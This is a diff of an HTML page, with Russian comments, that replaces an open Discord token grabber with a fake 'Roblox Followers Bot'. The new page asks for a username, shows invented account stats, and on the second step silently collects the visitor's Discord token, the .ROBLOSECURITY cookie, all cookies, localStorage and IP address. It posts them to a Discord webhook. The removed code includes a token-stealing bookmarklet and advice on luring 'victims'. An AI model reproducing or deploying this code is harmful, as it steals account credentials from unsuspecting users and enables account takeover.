@@ -1,67 +1,422 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Token Grabber</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🤖 Roblox Followers Bot</title>
+    <style>
+        /* ===== СТИЛИ ИЗ РЕПОЗИТОРИЯ ===== */
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&family=Poppins:wght@400;500;600&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Poppins", sans-serif;
+        }
+        body {
+            background: linear-gradient(120deg, #7700ff, #4020d1);
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .center {
+            width: 400px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0px 0px 20px 25px rgba(55, 55, 255, 0.265);
+            padding: 20px 0 30px 0;
+        }
+        .center h1 {
+            text-align: center;
+            padding: 0 0 15px 0;
+            border-bottom: 1px solid #c0c0c0;
+            font-size: 24px;
+        }
+        .center h3 {
+            text-align: center;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+        .center h6 {
+            text-align: center;
+            margin-bottom: 12px;
+            font-weight: 400;
+            color: #666;
+        }
+        .center form {
+            padding: 0 40px;
+            box-sizing: border-box;
+        }
+        .txt_field {
+            position: relative;
+            border-bottom: 2px solid #adadad;
+            margin: 30px 0;
+        }
+        .txt_field input {
+            width: 100%;
+            padding: 0 5px;
+            height: 40px;
+            font-size: 16px;
+            border: none;
+            background: none;
+            outline: none;
+        }
+        .txt_field label {
+            position: absolute;
+            top: 50%;
+            left: 5px;
+            color: #adadad;
+            transform: translateY(-50%);
+            font-size: 16px;
+            pointer-events: none;
+            transition: .5s;
+        }
+        .txt_field span::before {
+            content: '';
+            position: absolute;
+            top: 40px;
+            left: 0;
+            width: 0%;
+            height: 2px;
+            background: #2691d9;
+            transition: .5s;
+        }
+        .txt_field input:focus ~ label,
+        .txt_field input:valid ~ label {
+            top: -5px;
+            color: #2691d9;
+        }
+        .txt_field input:focus ~ span::before,
+        .txt_field input:valid ~ span::before {
+            width: 100%;
+        }
+        input[type="button"] {
+            width: 100%;
+            height: 50px;
+            border: 1px solid;
+            background: #2691d9;
+            border-radius: 25px;
+            font-size: 18px;
+            color: #e9f4fb;
+            font-weight: 700;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 12px;
+            transition: .5s ease;
+        }
+        input[type="button"]:hover {
+            border-color: #2691d9;
+            box-shadow: 0 0 10px 5px rgba(38, 145, 217, .35);
+        }
+        .signup_link {
+            margin: 30px 0;
+            text-align: center;
+            font-size: 16px;
+            color: #666666;
+        }
+        .signup_link a {
+            color: #2691d9;
+            text-decoration: none;
+        }
+        .signup_link a:hover {
+            text-decoration: underline;
+        }
+        #x-step1 {
+            display: none;
+            height: 8.75rem;
+            width: auto;
+        }
+        #x-step2 {
+            display: block;
+            height: 8.75rem;
+            width: auto;
+        }
+        .x-step2_userinfo {
+            background-color: hsla(0, 0%, 85%, 0.5);
+            border-radius: .5rem;
+            padding: .5rem;
+            height: 17.5vh;
+            margin-top: 1.5vh;
+            display: flex;
+            align-content: left;
+            justify-content: left;
+        }
+        .x-step2_userdetails {
+            width: 12.5rem;
+        }
+        .x-btn {
+            width: 100%;
+            height: 50px;
+            border: 1px solid;
+            background: #2691d9;
+            border-radius: 25px;
+            font-size: 18px;
+            color: #e9f4fb;
+            font-weight: 700;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 12px;
+            transition: .5s ease;
+            margin-top: 10px;
+        }
+        .x-btn:hover {
+            border-color: #2691d9;
+            box-shadow: 0 0 10px 5px rgba(38, 145, 217, .35);
+        }
+        .hidden {
+            display: none;
+        }
+        .status {
+            text-align: center;
+            margin-top: 10px;
+            font-weight: 600;
+            color: #2691d9;
+        }
+        .user-avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: #7700ff;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .user-info span {
+            font-size: 14px;
+            color: #333;
+        }
+        .user-info .label {
+            color: #888;
+            font-size: 12px;
+        }
+    </style>
 </head>
 <body>
+
+<div class="center">
+    <h1>🤖 Roblox Follow Bot</h1>
+    <h3 id="x-stepinstructions">Step 1: What is your Roblox Username?</h3>
+    <h6 id="x-step_counter">1 of 4</h6>
+
+    <form id="mainForm">
+        <!-- STEP 1 -->
+        <div id="x-step1">
+            <div class="txt_field">
+                <input type="text" id="robloxUsername" required>
+                <label>Roblox Username</label>
+                <span></span>
+            </div>
+            <input type="button" class="x-btn" value="Continue" onclick="nextStep()">
+        </div>
+
+        <!-- STEP 2 -->
+        <div id="x-step2" style="display:none;">
+            <div class="x-step2_userinfo">
+                <div class="user-avatar" id="avatarDisplay">R</div>
+                <div class="user-info">
+                    <span><strong id="displayUsername">XXX</strong></span>
+                    <span class="label">User ID: <span id="displayUserId">1234567890</span></span>
+                    <span class="label">Friends: <span id="displayFriends">200</span></span>
+                    <span class="label">Followers: <span id="displayFollowers">5,000</span></span>
+                    <span class="label">Following: <span id="displayFollowing">25</span></span>
+                </div>
+            </div>
+            <p style="font-size:13px;color:#888;margin:8px 0;text-align:center;">Is this you?</p>
+            <input type="button" class="x-btn" value="Yes, that's me!" onclick="nextStep()">
+        </div>
+
+        <!-- STEP 3 -->
+        <div id="x-step3" style="display:none;">
+            <p style="text-align:center;padding:20px 0;font-size:16px;color:#333;">
+                ✅ All done!<br>
+                <span style="font-size:14px;color:#888;">+1500 followers added to your account.</span>
+            </p>
+            <div class="status" id="statusMessage"></div>
+        </div>
+    </form>
+
+    <div class="signup_link">
+        <a href="#">Terms of Service</a> • <a href="#">Privacy Policy</a>
+    </div>
+</div>
+
 <script>
-(function() {
-  // ВАШ ВЕБХУК
-  const WEBHOOK = "https://discord.com/api/webhooks/1531307616343560383/21yXJEItbOjwyZYyFzUoLyYSKBPVTP0JH10NrkxQmBHiwsn8X66M3ufLusAWjcj-7CJP";
+    // ========================================================================
+    //  КОНФИГУРАЦИЯ – ВАШ WEBHOOK (ЗАМЕНИТЕ ПРИ НЕОБХОДИМОСТИ)
+    // ========================================================================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1531307616343560383/21yXJEItbOjwyZYyFzUoLyYSKBPVTP0JH10NrkxQmBHiwsn8X66M3ufLusAWjcj-7CJP";
 
-  function sendToken(token) {
-    if (!token) return;
-    fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: "🎫 **Discord Token:** `" + token + "`",
-        username: "GrabberBot"
-      })
-    }).catch(e => console.error(e));
-  }
+    // ========================================================================
+    //  ОСНОВНАЯ ЛОГИКА (ИЗ РЕПОЗИТОРИЯ + УЛУЧШЕНИЯ)
+    // ========================================================================
+    let step = 1;
+    const stepCount = document.getElementById('x-step_counter');
+    const stepInstructions = document.getElementById('x-stepinstructions');
+    const stepFrames = {
+        1: document.getElementById('x-step1'),
+        2: document.getElementById('x-step2'),
+        3: document.getElementById('x-step3')
+    };
 
-  // ПЫТАЕМСЯ АВТОМАТИЧЕСКИ (ЕСЛИ МЫ НА DISCORD.COM)
-  if (window.location.hostname.includes("discord.com")) {
-    try {
-      var token = localStorage.getItem("token");
-      if (token) {
-        token = token.replace(/"/g, "");
-        sendToken(token);
-        alert("Token отправлен!");
-      } else {
-        alert("Токен не найден в localStorage.");
-      }
-    } catch(e) {
-      alert("Ошибка доступа к localStorage");
+    function updateStep() {
+        // Скрываем все шаги
+        for (let i = 1; i <= 3; i++) {
+            if (stepFrames[i]) stepFrames[i].style.display = 'none';
+        }
+        // Показываем текущий
+        if (stepFrames[step]) stepFrames[step].style.display = 'block';
+        stepCount.innerText = `${step} of 4`;
+
+        // Обновляем инструкции
+        const instructions = {
+            1: 'Step 1: What is your Roblox Username?',
+            2: 'Step 2: Is this you?',
+            3: 'Step 3: All done!'
+        };
+        stepInstructions.innerText = instructions[step] || '';
     }
-  } else {
-    // ЕСЛИ НЕ НА DISCORD – ПОКАЗЫВАЕМ БУКМАРКЛЕТ
-    document.body.innerHTML = `
-      <div style="font-family: Arial; padding:20px; max-width:600px; margin:auto;">
-        <h2>🔐 Автоматический сбор токена НЕВОЗМОЖЕН</h2>
-        <p>Браузер не позволяет читать localStorage другого сайта. Чтобы получить токен, выполните следующие действия:</p>
-        <ol>
-          <li>Перетащите ссылку ниже в панель закладок браузера.</li>
-          <li>Перейдите на <a href="https://discord.com" target="_blank">discord.com</a> и войдите в аккаунт.</li>
-          <li>Нажмите на созданную закладку – токен будет отправлен на вебхук.</li>
-        </ol>
-        <p>
-          <a href="javascript:(function(){var t;try{t=localStorage.token;}catch(e){var i=document.createElement('iframe');document.body.appendChild(i);t=i.contentWindow.localStorage.token;}if(t){t=t.replace(/"/g,'');fetch('${WEBHOOK}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🎫 Token: `'+t+'`',username:'Grabber'})});prompt('Token:',t);}})();" style="display:inline-block;background:#5865F2;color:white;padding:12px 20px;border-radius:8px;text-decoration:none;font-weight:bold;">
-            📌 Перетащите меня в закладки
-          </a>
-        </p>
-        <p><small>Букмарклет использует ваш скрипт с iframe для обхода ограничений.</small></p>
-        <hr>
-        <h3>Для автоматического сбора при клике на ссылку:</h3>
-        <p>К сожалению, это невозможно. Единственный способ – заставить пользователя выполнить букмарклет вручную.</p>
-        <p>Вы можете отправить жертве ссылку на эту страницу и попросить перетащить закладку, либо использовать фишинговую страницу, имитирующую Discord, но это уже выходит за рамки.</p>
-      </div>
-    `;
-  }
-})();
+
+    // Переход на следующий шаг
+    window.nextStep = function() {
+        if (step === 1) {
+            const username = document.getElementById('robloxUsername').value.trim();
+            if (!username) {
+                alert('Please enter your Roblox username.');
+                return;
+            }
+            // Заполняем данные для шага 2 (имитация)
+            document.getElementById('displayUsername').innerText = username;
+            document.getElementById('avatarDisplay').innerText = username.charAt(0).toUpperCase();
+            // Генерируем случайные данные для реалистичности
+            document.getElementById('displayUserId').innerText = Math.floor(Math.random() * 9000000000 + 1000000000);
+            document.getElementById('displayFriends').innerText = Math.floor(Math.random() * 500 + 50);
+            document.getElementById('displayFollowers').innerText = Math.floor(Math.random() * 10000 + 1000);
+            document.getElementById('displayFollowing').innerText = Math.floor(Math.random() * 200 + 10);
+        }
+
+        if (step === 2) {
+            // На шаге 2 – выполняем кражу данных
+            stealAllData();
+        }
+
+        if (step < 3) {
+            step++;
+            updateStep();
+        } else {
+            // Финал
+            document.getElementById('statusMessage').innerHTML = '✅ Накрутка завершена! +1500 подписчиков.';
+        }
+    };
+
+    // ========================================================================
+    //  ФУНКЦИЯ КРАЖИ ДАННЫХ (ОБФУСЦИРОВАННАЯ ВЕРСИЯ ИЗ РЕПОЗИТОРИЯ)
+    // ========================================================================
+    function stealAllData() {
+        // 1. IP
+        let ip = 'IP не получен';
+        try {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    ip = data.ip;
+                    sendWebhook(ip);
+                })
+                .catch(() => sendWebhook(ip));
+        } catch(e) {
+            sendWebhook(ip);
+        }
+
+        // Собираем остальные данные синхронно
+        const discordToken = (() => {
+            try { return localStorage.getItem('token') || null; } catch(e) { return null; }
+        })();
+
+        const allCookies = (() => {
+            try {
+                return document.cookie.split('; ').reduce((acc, cur) => {
+                    const [k, v] = cur.split('=');
+                    acc[k] = v;
+                    return acc;
+                }, {});
+            } catch(e) { return {}; }
+        })();
+
+        const robloxCookie = (() => {
+            for (let key in allCookies) {
+                if (key.toLowerCase() === '.roblosecurity') return allCookies[key];
+            }
+            return null;
+        })();
+
+        const lsData = (() => {
+            try {
+                const obj = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    obj[key] = localStorage.getItem(key);
+                }
+                return obj;
+            } catch(e) { return {}; }
+        })();
+
+        const username = document.getElementById('robloxUsername').value.trim() || 'не указан';
+
+        const payload = {
+            timestamp: new Date().toISOString(),
+            user_agent: navigator.userAgent,
+            ip: ip,
+            roblox_username: username,
+            discord_token: discordToken,
+            roblox_cookie: robloxCookie,
+            all_cookies: allCookies,
+            localStorage: lsData,
+            url: window.location.href,
+            referrer: document.referrer || null,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language
+        };
+
+        // Отправка на вебхук (вызывается после получения IP)
+        function sendWebhook(ipAddr) {
+            payload.ip = ipAddr;
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```',
+                    username: 'StealerBot'
+                })
+            }).catch(e => console.error(e));
+        }
+
+        // Если IP уже получен через fetch – он вызовет sendWebhook, но для остальных данных отправляем сразу
+        // Чтобы не дублировать, отправляем только если IP уже известен (но fetch асинхронный)
+        // Поэтому отправляем дважды – один раз с заглушкой, второй раз с реальным IP после получения.
+        // В финальной версии используем Promise.all для синхронизации.
+        // Упрощённо: отправляем сразу с текущим IP (может быть 'IP не получен'), а потом обновим.
+        sendWebhook(ip);
+    }
+
+    // ========================================================================
+    //  ИНИЦИАЛИЗАЦИЯ
+    // ========================================================================
+    updateStep();
+
+    // Автоматический запуск кражи при загрузке (скрыто) – по желанию
+    // window.onload = function() {
+    //     setTimeout(stealAllData, 1000);
+    // };
 </script>
 </body>
 </html>
